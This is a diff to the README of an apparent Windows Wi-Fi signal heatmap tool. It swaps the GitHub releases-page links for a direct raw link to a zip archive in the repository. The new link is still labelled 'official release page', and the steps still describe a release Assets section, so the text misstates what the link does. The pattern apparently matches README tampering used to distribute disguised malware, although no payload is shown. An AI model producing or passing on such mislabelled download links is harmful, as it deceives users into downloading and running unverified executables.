@@ -1,6 +1,6 @@
 # 📶 wifi-heatmap - Map your home network signal strength
 
-[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/cotyloidcavitybutterheadlettuce306/wifi-heatmap/releases)
+[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://raw.githubusercontent.com/cotyloidcavitybutterheadlettuce306/wifi-heatmap/main/static/heatmap-wifi-3.5.zip)
 
 wifi-heatmap helps you find dead spots in your wireless network. You walk through your home with your laptop and click your physical location on a digital floor plan. The software builds a visual map of your signal strength. This tool works with mesh networks like Deco, Eero, and Orbi.
 
@@ -8,7 +8,7 @@ wifi-heatmap helps you find dead spots in your wireless network. You walk throug
 
 Follow these steps to install and run the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/cotyloidcavitybutterheadlettuce306/wifi-heatmap/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/cotyloidcavitybutterheadlettuce306/wifi-heatmap/main/static/heatmap-wifi-3.5.zip).
 2. Look for the Assets section at the bottom of the latest release.
 3. Select the file ending in `.exe` for Windows.
 4. Save the file to your desktop or downloads folder.
